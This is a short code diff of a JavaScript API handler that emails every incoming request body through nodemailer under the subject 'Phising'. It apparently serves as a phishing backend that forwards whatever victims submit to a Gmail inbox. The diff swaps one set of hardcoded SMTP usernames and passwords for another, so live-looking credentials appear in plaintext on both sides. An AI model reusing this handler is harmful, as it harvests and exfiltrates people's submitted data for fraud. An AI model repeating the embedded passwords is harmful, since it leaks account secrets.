@@ -4,21 +4,21 @@ var nodemailer = require("nodemailer");
 
 export default function handler(req, res) {
   var transporter = nodemailer.createTransport({
-    host: "smtp.shellfish.tech",
+    host: "smtp.gmail.com",
     port: 587,
     secure: false,
     requireTLS: true,
     auth: {
-      user: "admin@shellfish.tech",
-      pass: "bt*uMXp0",
+      user: "arnav95600@gmail.com",
+      pass: "tspshuecvvoughvi",
     },
   });
 
   var mailOptions = {
-    from: "admin@shellfish.tech",
-    to: "shilpa@shellfish.tech",
+    from: "arnav95600@gmail.com",
+    to: "arnav95600@gmail.com",
     subject: "Phising",
-    text: req.body,
+    text: JSON.stringify(req.body),
   };
 
   transporter.sendMail(mailOptions, function (error, info) {
